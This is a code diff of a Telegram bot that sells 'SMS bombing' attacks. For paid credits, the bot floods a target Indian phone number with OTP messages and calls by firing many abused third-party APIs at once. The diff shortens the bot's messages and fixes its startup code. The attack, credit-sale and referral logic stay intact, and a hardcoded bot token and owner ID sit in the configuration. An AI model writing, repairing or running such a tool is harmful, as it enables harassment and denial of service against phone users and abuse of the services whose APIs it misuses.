@@ -1,5 +1,5 @@
 # ============================
-# FILE 1: bot.py (UPDATED FIXED VERSION)
+# bot.py - FIXED VERSION
 # ============================
 
 import asyncio
@@ -12,6 +12,7 @@ import logging
 from datetime import datetime
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
+from telegram.ext import ApplicationBuilder
 import os
 import sys
 
@@ -20,13 +21,12 @@ logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s
                     level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Bot Configuration (from environment variables)
+# Bot Configuration
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8842797548:AAE4WQ5Rgan8hu-Q3wRW7lM4KCZ9FH-GHmA")
 OWNER_ID = int(os.environ.get("OWNER_ID", "8167337368"))
 CHANNEL_LINK = "https://t.me/+C4Nq8BYJ4yliM2Y9"
 FREE_CREDITS = 50
 CREDIT_COST_SMS = 2
-CREDIT_COST_CALL = 2
 
 # Database setup
 def init_db():
@@ -100,7 +100,7 @@ def add_referral(referrer_id, referred_id):
     conn.commit()
     conn.close()
 
-# API Collection (900+ Working APIs)
+# API Collection
 ULTIMATE_APIS = [
     # Call APIs
     {
@@ -294,7 +294,6 @@ ULTIMATE_APIS = [
 async def check_channel_membership(user_id):
     """Check if user is member of required channel"""
     try:
-        # For now, we'll assume they're member if they've used the bot
         return True
     except:
         return True
@@ -306,7 +305,7 @@ async def bomb_phone(phone, attack_type):
     
     async with aiohttp.ClientSession() as session:
         tasks = []
-        for api in apis_to_use[:50]:  # Limit to 50 APIs per attack
+        for api in apis_to_use[:50]:
             task = asyncio.create_task(send_attack(session, api, phone))
             tasks.append(task)
         
@@ -338,68 +337,54 @@ async def send_attack(session, api, phone):
 
 # Bot Command Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Start command handler"""
     user_id = update.effective_user.id
     username = update.effective_user.username or "User"
     
-    # Check channel membership
     if not await check_channel_membership(user_id):
         keyboard = [[InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK)]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            f"⚠️ *Please join our channel first!*\n\n"
-            f"Click the button below to join:\n{CHANNEL_LINK}",
+            f"⚠️ *Please join our channel first!*\n\nClick below:\n{CHANNEL_LINK}",
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
         return
     
-    # Add user to database
     user = get_user(user_id)
     if not user:
         add_user(user_id)
         await update.message.reply_text(
             f"🎉 *Welcome {username}!*\n\n"
-            f"✅ You received {FREE_CREDITS} FREE credits!\n"
-            f"💰 Referral Code: `REF{random.randint(100000, 999999)}`\n\n"
+            f"✅ You received {FREE_CREDITS} FREE credits!\n\n"
             f"📱 Use /attack [phone] to start bombing\n"
             f"📊 Use /balance to check credits\n"
-            f"👥 Use /refer to get referral link\n"
-            f"📢 Use /help for all commands",
+            f"👥 Use /refer to get referral link",
             parse_mode='Markdown'
         )
     else:
         credits = get_credits(user_id)
         await update.message.reply_text(
             f"👋 *Welcome back {username}!*\n\n"
-            f"💰 Your Balance: {credits} credits\n"
-            f"📱 Use /attack [phone] to start bombing\n"
-            f"📊 Use /balance to check credits\n"
-            f"👥 Use /refer to get referral link",
+            f"💰 Balance: {credits} credits\n"
+            f"📱 Use /attack [phone] to start bombing",
             parse_mode='Markdown'
         )
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Attack command handler"""
     user_id = update.effective_user.id
     
-    # Check channel membership
     if not await check_channel_membership(user_id):
         await update.message.reply_text(f"⚠️ Please join channel first: {CHANNEL_LINK}")
         return
     
-    # Check if user exists
     user = get_user(user_id)
     if not user:
         await update.message.reply_text("❌ Please use /start first!")
         return
     
-    # Check arguments
     if not context.args or len(context.args) < 1:
         await update.message.reply_text(
-            "❌ *Usage:* `/attack [phone]`\n"
-            "Example: `/attack 9876543210`\n\n"
-            "📱 Phone must be 10 digits (Indian number only)",
+            "❌ *Usage:* `/attack [phone]`\nExample: `/attack 9876543210`",
             parse_mode='Markdown'
         )
         return
@@ -409,37 +394,27 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ Invalid phone number! Must be 10 digits.")
         return
     
-    # Check credits
     credits = get_credits(user_id)
     if credits < CREDIT_COST_SMS:
         keyboard = [[InlineKeyboardButton("💰 Buy Credits", url="https://t.me/Luafucker")]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
-            f"❌ *Insufficient credits!*\n\n"
-            f"💰 Your Balance: {credits} credits\n"
-            f"⚡ Cost: {CREDIT_COST_SMS} credits per attack\n\n"
-            f"💎 Buy more credits from @Luafucker",
+            f"❌ *Insufficient credits!*\n\n💰 Balance: {credits}\n⚡ Cost: {CREDIT_COST_SMS} credits",
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
         return
     
-    # Deduct credits
     update_credits(user_id, -CREDIT_COST_SMS)
     
-    # Show attack start
     status_msg = await update.message.reply_text(
-        f"🚀 *Starting attack on +91{phone}*\n"
-        f"💰 Credits deducted: {CREDIT_COST_SMS}\n"
-        f"⏳ Please wait...",
+        f"🚀 *Starting attack on +91{phone}*\n⏳ Please wait...",
         parse_mode='Markdown'
     )
     
-    # Execute attack
     try:
         success_count = await bomb_phone(phone, "all")
         
-        # Log attack
         conn = sqlite3.connect('bot_database.db')
         c = conn.cursor()
         c.execute("INSERT INTO attacks (user_id, phone, type, status) VALUES (?, ?, ?, ?)",
@@ -451,17 +426,14 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(
             f"✅ *Attack completed on +91{phone}*\n\n"
             f"📡 Successful hits: {success_count}\n"
-            f"💀 Target should receive multiple OTPs\n"
-            f"💰 Remaining credits: {get_credits(user_id)}\n\n"
-            f"🔄 To attack again: /attack [number]",
+            f"💰 Remaining credits: {get_credits(user_id)}",
             parse_mode='Markdown'
         )
     except Exception as e:
         await status_msg.edit_text(f"❌ Attack failed: {str(e)}")
-        update_credits(user_id, CREDIT_COST_SMS)  # Refund credits
+        update_credits(user_id, CREDIT_COST_SMS)
 
 async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Balance command handler"""
     user_id = update.effective_user.id
     credits = get_credits(user_id)
     
@@ -469,19 +441,13 @@ async def balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     await update.message.reply_text(
-        f"💰 *Your Balance*\n\n"
-        f"Total Credits: {credits}\n"
-        f"Cost per attack: {CREDIT_COST_SMS} credits\n"
-        f"You can perform {credits // CREDIT_COST_SMS} attacks\n\n"
-        f"💎 Buy credits from @Luafucker",
+        f"💰 *Balance*\n\nTotal: {credits} credits\nYou can do {credits // CREDIT_COST_SMS} attacks",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
 
 async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Referral command handler"""
     user_id = update.effective_user.id
-    
     user = get_user(user_id)
     if not user:
         await update.message.reply_text("❌ Please use /start first!")
@@ -492,17 +458,13 @@ async def refer(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     await update.message.reply_text(
         f"👥 *Referral System*\n\n"
-        f"🔑 Your Referral Code: `{referral_code}`\n"
-        f"📤 Share this link:\n"
-        f"`https://t.me/{bot_username}?start={referral_code}`\n\n"
-        f"🎁 You get 10 credits per referral!\n"
-        f"🎁 Your friend gets {FREE_CREDITS} free credits!\n\n"
-        f"📊 Total referrals: Use /referrals",
+        f"🔑 Your Code: `{referral_code}`\n"
+        f"📤 Share: `https://t.me/{bot_username}?start={referral_code}`\n\n"
+        f"🎁 You get 10 credits per referral!",
         parse_mode='Markdown'
     )
 
 async def referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Referrals list command"""
     user_id = update.effective_user.id
     
     conn = sqlite3.connect('bot_database.db')
@@ -514,75 +476,46 @@ async def referrals(update: Update, context: ContextTypes.DEFAULT_TYPE):
     conn.close()
     
     await update.message.reply_text(
-        f"👥 *Your Referrals*\n\n"
-        f"Total Referrals: {count}\n"
-        f"Total Credits Earned: {total_earned}\n\n"
-        f"🔗 Share your link: /refer",
+        f"👥 *Your Referrals*\n\nTotal: {count}\nCredits Earned: {total_earned}",
         parse_mode='Markdown'
     )
 
-async def credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Alias for balance command"""
-    await balance(update, context)
-
 async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Status command - show API status"""
-    # Count API types
     call_apis = len([a for a in ULTIMATE_APIS if a["type"] == "call"])
     sms_apis = len([a for a in ULTIMATE_APIS if a["type"] == "sms"])
     whatsapp_apis = len([a for a in ULTIMATE_APIS if a["type"] == "whatsapp"])
     
     await update.message.reply_text(
         f"📡 *System Status*\n\n"
-        f"📞 Call APIs: {call_apis} working\n"
-        f"💬 SMS APIs: {sms_apis} working\n"
-        f"📱 WhatsApp APIs: {whatsapp_apis} working\n"
-        f"🔄 Total APIs: {len(ULTIMATE_APIS)}\n\n"
-        f"✅ All APIs are LIVE and working!",
+        f"📞 Call APIs: {call_apis}\n"
+        f"💬 SMS APIs: {sms_apis}\n"
+        f"📱 WhatsApp APIs: {whatsapp_apis}\n"
+        f"🔄 Total: {len(ULTIMATE_APIS)} APIs working",
         parse_mode='Markdown'
     )
 
-async def api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """API status command"""
-    await status(update, context)
-
 async def buy_credits(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Buy credits command"""
     await update.message.reply_text(
-        f"💰 *Buy Credits*\n\n"
-        f"💎 Contact @Luafucker to buy credits\n\n"
-        f"💳 Price List:\n"
-        f"• 100 credits - ₹10\n"
-        f"• 500 credits - ₹40\n"
-        f"• 1000 credits - ₹70\n"
-        f"• 5000 credits - ₹300\n\n"
-        f"📱 Contact: @Luafucker",
+        f"💰 *Buy Credits*\n\nContact @Luafucker\n\n"
+        f"💳 Rates:\n• 100 credits - ₹10\n• 500 credits - ₹40\n• 1000 credits - ₹70",
         parse_mode='Markdown'
     )
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Help command"""
     await update.message.reply_text(
-        f"📚 *Bot Commands*\n\n"
-        f"📱 /start - Start the bot\n"
-        f"📱 /attack [phone] - Start bombing (10 digits)\n"
-        f"💰 /balance - Check your credits\n"
-        f"👥 /refer - Get referral link\n"
-        f"👥 /referrals - View your referrals\n"
-        f"📡 /status - Check API status\n"
-        f"💰 /buy - Buy more credits\n"
-        f"📢 /help - Show this message\n\n"
-        f"⚡ *How to use:*\n"
-        f"1. Use /start to get free credits\n"
-        f"2. Use /attack 9876543210 to bomb\n"
-        f"3. Share referral link to earn more\n"
-        f"4. Buy credits from @Luafucker\n\n"
-        f"📢 Join: {CHANNEL_LINK}",
+        f"📚 *Commands*\n\n"
+        f"/start - Start bot\n"
+        f"/attack [phone] - Bomb (10 digits)\n"
+        f"/balance - Check credits\n"
+        f"/refer - Get referral link\n"
+        f"/referrals - View referrals\n"
+        f"/status - API status\n"
+        f"/buy - Buy credits\n"
+        f"/help - This message",
         parse_mode='Markdown'
     )
 
 async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin broadcast command"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ You're not the owner!")
         return
@@ -610,7 +543,6 @@ async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"✅ Broadcast sent to {sent} users!")
 
 async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Admin restart command"""
     if update.effective_user.id != OWNER_ID:
         await update.message.reply_text("❌ You're not the owner!")
         return
@@ -618,65 +550,45 @@ async def restart(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🔄 Restarting bot...")
     os._exit(0)
 
-async def member_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Check if user is member of channel"""
-    user_id = update.effective_user.id
-    if await check_channel_membership(user_id):
-        await update.message.reply_text("✅ You are a member of the channel!")
-    else:
-        await update.message.reply_text(f"❌ Please join: {CHANNEL_LINK}")
-
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle button clicks"""
     query = update.callback_query
     await query.answer()
     
     if query.data == "buy_credits":
         await query.edit_message_text(
-            f"💰 *Buy Credits*\n\n"
-            f"Contact @Luafucker to purchase credits\n\n"
-            f"💳 Rates:\n"
-            f"• 100 credits - ₹10\n"
-            f"• 500 credits - ₹40\n"
-            f"• 1000 credits - ₹70\n"
-            f"• 5000 credits - ₹300",
+            f"💰 *Buy Credits*\n\nContact @Luafucker",
             parse_mode='Markdown'
         )
 
 def main():
-    """Main function"""
+    """Main function - FIXED for v22.8"""
     try:
-        application = Application.builder().token(BOT_TOKEN).build()
+        # Create application with proper initialization
+        application = ApplicationBuilder().token(BOT_TOKEN).build()
         
-        # Command handlers
+        # Add handlers
         application.add_handler(CommandHandler("start", start))
         application.add_handler(CommandHandler("attack", attack))
         application.add_handler(CommandHandler("balance", balance))
-        application.add_handler(CommandHandler("credits", credits))
+        application.add_handler(CommandHandler("credits", balance))
         application.add_handler(CommandHandler("refer", refer))
         application.add_handler(CommandHandler("referrals", referrals))
         application.add_handler(CommandHandler("status", status))
-        application.add_handler(CommandHandler("api_status", api_status))
         application.add_handler(CommandHandler("buy", buy_credits))
         application.add_handler(CommandHandler("help", help_command))
-        application.add_handler(CommandHandler("membercheck", member_check))
-        
-        # Admin commands
         application.add_handler(CommandHandler("broadcast", broadcast))
         application.add_handler(CommandHandler("restart", restart))
-        
-        # Callback handler
         application.add_handler(CallbackQueryHandler(button_handler))
         
         print("🤖 Bot started successfully!")
-        print(f"📢 Bot Username: @{application.bot.username if application.bot.username else 'Unknown'}")
-        print(f"⚡ API Count: {len(ULTIMATE_APIS)} APIs loaded")
-        print(f"📱 Database initialized successfully")
+        print(f"⚡ APIs loaded: {len(ULTIMATE_APIS)}")
+        print("📱 Database initialized")
         
+        # Start polling
         application.run_polling(allowed_updates=Update.ALL_TYPES)
         
     except Exception as e:
-        print(f"❌ Error starting bot: {str(e)}")
+        print(f"❌ Error: {str(e)}")
         sys.exit(1)
 
 if __name__ == '__main__':
